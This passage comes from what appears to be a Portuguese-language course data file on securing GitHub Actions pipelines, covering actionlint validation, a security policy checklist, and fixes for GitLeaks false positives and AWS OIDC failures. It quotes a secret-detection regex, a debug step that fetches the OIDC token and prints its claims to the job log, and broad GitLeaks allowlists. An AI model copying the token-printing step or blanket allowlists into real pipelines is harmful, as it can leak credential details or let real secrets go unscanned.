grep "scan-type:" .github/workflows/secure.yml
# Saida esperada: image, fs, config

# Verificar que upload e sempre feito (mesmo em falha)
grep -B2 "upload-sarif" .github/workflows/secure.yml | grep "if: always"
# Saida esperada: "if: always()"

# Verificar permissoes do job de seguranca
grep -A 5 "security-scan:" .github/workflows/secure.yml | grep -A 3 "permissions:"
# Saida esperada: contents: read e security-events: write

echo "Jobs de seguranca validados!"
\`\`\``
      },
      {
        title: 'Criar politica de seguranca e validar com actionlint',
        instruction: `Crie um arquivo de politica de seguranca documentando os requisitos do pipeline, e valide o workflow com actionlint para detectar problemas adicionais.`,
        hints: [
          'actionlint pode ser instalado com curl ou go install',
          'Documente a politica em SECURITY.md ou .github/SECURITY.md',
          'Verifique que o workflow seguro passa em todos os checks do actionlint'
        ],
        solution: `\`\`\`bash
# Instalar actionlint (linter para GitHub Actions)
curl -s https://api.github.com/repos/rhysd/actionlint/releases/latest | \
  grep "browser_download_url.*linux_amd64" | \
  cut -d '"' -f 4 | \
  xargs curl -L -o /tmp/actionlint.tar.gz

tar xzf /tmp/actionlint.tar.gz -C /tmp/ actionlint
sudo mv /tmp/actionlint /usr/local/bin/

# Validar workflow seguro
echo "=== Validando workflow seguro ==="
actionlint .github/workflows/secure.yml
echo "ActionLint: exit code \$?"

# Validar workflow inseguro (deve mostrar problemas)
echo "=== Validando workflow inseguro ==="
actionlint .github/workflows/insecure.yml 2>&1 || true

# Criar politica de seguranca do pipeline
mkdir -p .github

cat > .github/SECURITY.md << 'EOF'
# Politica de Seguranca dos Pipelines CI/CD

## Requisitos Obrigatorios

### Secrets e Autenticacao
- [ ] GITHUB_TOKEN com \`permissions:\` minimas declaradas por job
- [ ] Autenticacao com clouds (AWS/Azure/GCP) via OIDC — sem secrets permanentes
- [ ] Secrets passados via \`env:\` nos steps, nunca interpolados em \`run:\`
- [ ] Nenhum secret hardcoded em qualquer arquivo

### Actions de Terceiros
- [ ] Todas as Actions pinadas por commit SHA
- [ ] SHAs atualizados mensalmente via Dependabot
- [ ] Apenas Actions de publishers verificados (GitHub, Docker, AWS, etc.)

### Scans de Seguranca (obrigatorios em todo PR)
- [ ] Trivy image scan (exit-code: 1 em CRITICAL)
- [ ] Trivy filesystem scan (deteccao de secrets)
- [ ] Trivy config scan (misconfiguracao de IaC)
- [ ] GitLeaks para historico Git

### Build e Imagens
- [ ] Multi-stage builds (sem ferramentas de build na imagem final)
- [ ] Cosign signing para imagens de producao
- [ ] SBOM gerado e armazenado por release
- [ ] Imagens baseadas em base images verificadas

### Self-hosted Runners (se aplicavel)
- [ ] Runners efemeros (destruidos apos cada job)
- [ ] Nao disponivel para repositorios publicos
- [ ] Sem docker.sock montado
- [ ] RBAC minimo no cluster Kubernetes

## Processo de Revisao
Todo workflow novo ou modificado deve ser revisado por:
- 1 membro do time de plataforma
- 1 membro do time de seguranca
EOF

echo "Politica de seguranca criada!"
cat .github/SECURITY.md

# Sumario final
echo ""
echo "=== Sumario do Lab de Seguranca ==="
echo "Arquivos criados:"
find . -type f -name "*.yml" -o -name "*.md" | grep -v ".git"
\`\`\``,
        verify: `\`\`\`bash
# Verificar actionlint instalado
actionlint --version

# Validar workflow seguro com actionlint
actionlint .github/workflows/secure.yml
EXITCODE=\$?
if [ \$EXITCODE -eq 0 ]; then
  echo "ActionLint: PASSOU - nenhum problema encontrado ✓"
else
  echo "ActionLint: encontrou \$EXITCODE problemas"
fi

# Verificar que SECURITY.md foi criado
ls .github/SECURITY.md
echo "Politica de seguranca: criada ✓"

# Verificar checklist de seguranca no workflow
echo ""
echo "=== Checklist de seguranca ==="
echo -n "permissions declaradas: "
grep -c "permissions:" .github/workflows/secure.yml > /dev/null && echo "✓" || echo "✗"

echo -n "Actions pinadas por SHA: "
UNPINNED=\$(grep "uses:" .github/workflows/secure.yml | grep -v "@[a-f0-9]\{40\}" | wc -l)
[ \$UNPINNED -eq 0 ] && echo "✓" || echo "✗ (\$UNPINNED nao pinadas)"

echo -n "Trivy scan configurado: "
grep -q "trivy-action" .github/workflows/secure.yml && echo "✓" || echo "✗"

echo -n "Upload SARIF sempre feito: "
grep -q "if: always()" .github/workflows/secure.yml && echo "✓" || echo "✗"

echo ""
echo "Lab de Seguranca em Pipelines CI/CD completo!"
\`\`\``
      }
    ]
  },
  troubleshooting: [
    {
      title: 'GitLeaks detecta "secret" em arquivo de teste ou configuracao',
      difficulty: 'easy',
      symptom: 'O scan do GitLeaks falha com "secret detected" em um arquivo de testes que contem uma chave de API falsa para exemplo, ou uma senha de desenvolvimento que e publica por design.',
      diagnosis: `\`\`\`bash
# 1. Ver o que o GitLeaks detectou
# No log do GitHub Actions, procurar:
# "leaks found: X"
# "file: path/to/file"
# "rule: generic-api-key"

# 2. Verificar o arquivo detectado
cat tests/test_config.py
# Verificar se e realmente um secret ou um falso positivo

# 3. Verificar a regra que triggerou
# GitLeaks usa regex patterns como:
# (api|secret|key|token|password) = ['"][0-9a-zA-Z]{20,}['"]
\`\`\``,
      solution: `**Causa:** Falso positivo — arquivo de teste com valor de exemplo

**Solucao 1 — Adicionar inline ignore:**
\`\`\`python
# tests/test_config.py
API_KEY = "example-key-1234567890abcdef"  # gitleaks:allow
TEST_PASSWORD = "test-only-not-real-abc123"  # gitleaks:allow
\`\`\`

**Solucao 2 — Arquivo .gitleaks.toml com exclusoes:**
\`\`\`toml
# .gitleaks.toml
[allowlist]
  description = "Allowlist for test files"
  files = [
    "tests/.*",
    ".*_test.py",
    ".*test.*\\.py",
    "docs/.*",
    "examples/.*"
  ]
  regexes = [
    "example-api-key-\\\\d+",
    "test-only-not-real"
  ]
\`\`\`

**Solucao 3 — Configurar no workflow:**
\`\`\`yaml
- uses: gitleaks/gitleaks-action@v2
  env:
    GITHUB_TOKEN: \${{ secrets.GITHUB_TOKEN }}
  with:
    config-path: .gitleaks.toml  # usar config customizada
\`\`\`

**Verificar se e real:**
\`\`\`bash
# Checar se o valor aparece em producao
git log --all -S "valor-detectado" -- .
# Se aparecer em muitos commits de dev: provavelmente falso positivo
\`\`\``
    },
    {
      title: 'OIDC falha com "not authorized to assume role"',
      difficulty: 'medium',
      symptom: 'O step de autenticacao AWS via OIDC falha com "Not authorized to perform sts:AssumeRoleWithWebIdentity" ou "OpenIDConnect provider is not authorized". O mesmo workflow funcionava antes.',
      diagnosis: `\`\`\`bash
# 1. Verificar a permissao id-token no job
grep -A 5 "permissions:" .github/workflows/deploy.yml

# 2. Verificar a trust policy da role AWS
aws iam get-role --role-name github-actions-deploy \
  --query 'Role.AssumeRolePolicyDocument'

# 3. Ver o token OIDC que esta sendo gerado (debug)
# Adicionar step temporario:
- name: Debug OIDC token
  run: |
    TOKEN=\$(curl -s -H "Authorization: bearer \$ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
      "\$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
    echo "Token claims:"
    echo \$TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
\`\`\``,
      solution: `**Causa 1 — Falta permissao id-token: write:**
\`\`\`yaml
jobs:
  deploy:
    permissions:
      id-token: write  # OBRIGATORIO para OIDC
      contents: read
\`\`\`

**Causa 2 — Trust policy muito restritiva na AWS:**
\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Federated": "arn:aws:iam::ACCOUNT:oidc-provider/token.actions.githubusercontent.com"
      },
      "Action": "sts:AssumeRoleWithWebIdentity",
      "Condition": {
        "StringLike": {
          "token.actions.githubusercontent.com:sub":
            "repo:MYORG/MYREPO:*"
        },
        "StringEquals": {
          "token.actions.githubusercontent.com:aud": "sts.amazonaws.com"
        }
      }
    }
  ]
}
\`\`\`

**Causa 3 — Branch nao permitida na trust policy:**
\`\`\`
# Sub claim do token:
repo:myorg/myrepo:ref:refs/heads/main

# Se a trust policy so permite "main" e voce esta em "feature/xyz":
# Atualizar Condition para aceitar:
"repo:myorg/myrepo:*"  # qualquer branch
# OU
"repo:myorg/myrepo:ref:refs/heads/main"  # apenas main
\`\`\`

**Verificar apos corrigir:**
\`\`\`bash
# Simular com aws sts:
aws sts get-caller-identity  # deve funcionar sem erro
\`\`\``
    }
  ]
};
